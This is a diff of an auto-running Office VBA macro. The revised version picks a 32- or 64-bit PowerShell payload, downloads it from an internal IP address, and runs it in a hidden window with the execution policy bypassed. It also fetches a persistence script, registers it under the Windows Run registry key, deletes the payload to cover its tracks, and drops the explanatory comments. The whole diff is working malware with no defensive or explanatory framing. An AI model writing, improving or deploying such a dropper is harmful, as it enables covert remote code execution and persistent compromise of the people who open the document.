@@ -10,23 +10,46 @@ Sub Auto_Open()
     Dim WHTTP1 As Object
     Dim WshShell As Object
     
-    'pulls down payload.ps1
-    
-    On Error Resume Next
+
+ If GetObject("winmgmts:root\cimv2:Win32_Processor='cpu0'").AddressWidth _
+       = 32 Then
+        On Error Resume Next
         Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
         If Err.Number <> 0 Then
             Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
         End If
     On Error GoTo 0
     
-    MyFile = "http://192.168.1.132/payload.ps1"
+    MyFile = "http://192.168.1.127/x32.ps1"
     
     WHTTP.Open "GET", MyFile, False
     WHTTP.Send
     FileData = WHTTP.ResponseBody
     Set WHTTP = Nothing
     
-    'drops in C:\Temp
+    If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
+    
+    FileNum = FreeFile
+    Open "C:\Temp\payload.ps1" For Binary Access Write As #FileNum
+        Put #FileNum, 1, FileData
+    Close #FileNum
+
+        
+    Else
+    
+     On Error Resume Next
+        Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5")
+        If Err.Number <> 0 Then
+            Set WHTTP = CreateObject("WinHTTP.WinHTTPrequest.5.1")
+        End If
+    On Error GoTo 0
+    
+    MyFile = "http://192.168.1.127/x64.ps1"
+    
+    WHTTP.Open "GET", MyFile, False
+    WHTTP.Send
+    FileData = WHTTP.ResponseBody
+    Set WHTTP = Nothing
     
     If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
     
@@ -35,9 +58,11 @@ Sub Auto_Open()
         Put #FileNum, 1, FileData
     Close #FileNum
     
-    'hide windows                
-                       
-    Const HIDDEN_WINDOW = 0
+    
+    End If
+    
+    
+     Const HIDDEN_WINDOW = 0
  
 strComputer = "."
  
@@ -48,12 +73,9 @@ Set objConfig = objStartup.SpawnInstance_
 objConfig.ShowWindow = HIDDEN_WINDOW
  
 Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
-
-'execute payload
  
 objProcess.Create "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -file C:\Temp\payload.ps1", Null, objConfig, intProcessID
 
-'pull down persist script
 
 On Error Resume Next
         Set WHTTP1 = CreateObject("WinHTTP.WinHTTPrequest.5")
@@ -62,14 +84,12 @@ On Error Resume Next
         End If
     On Error GoTo 0
     
-    MyFile1 = "http://192.168.1.132/persist.vbs"
+    MyFile1 = "http://192.168.1.127/persist.vbs"
     
     WHTTP1.Open "GET", MyFile1, False
     WHTTP1.Send
     FileData1 = WHTTP1.ResponseBody
     Set WHTT1P = Nothing
-    
-    'drop in C:\Temp
     
     If Dir("C:\Temp", vbDirectory) = Empty Then MkDir "C:\Temp"
     FileNum1 = FreeFile
@@ -77,19 +97,13 @@ On Error Resume Next
         Put #FileNum1, 1, FileData1
     Close #FileNum1
     
-    'create reg key
     
     Set WshShell = CreateObject("WScript.Shell")
-    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Persist", "C:\Temp\persist.vbs", "REG_SZ"
+    WshShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Testing", "C:\Temp\persist.vbs", "REG_SZ"
     Set WshShell = Nothing
-    
-    'wait 15 sec and remove payload
     
     Application.Wait (Now + TimeValue("0:00:15"))
 
     Kill "C:\Temp\payload.ps1"
-
     
 End Sub
-
-
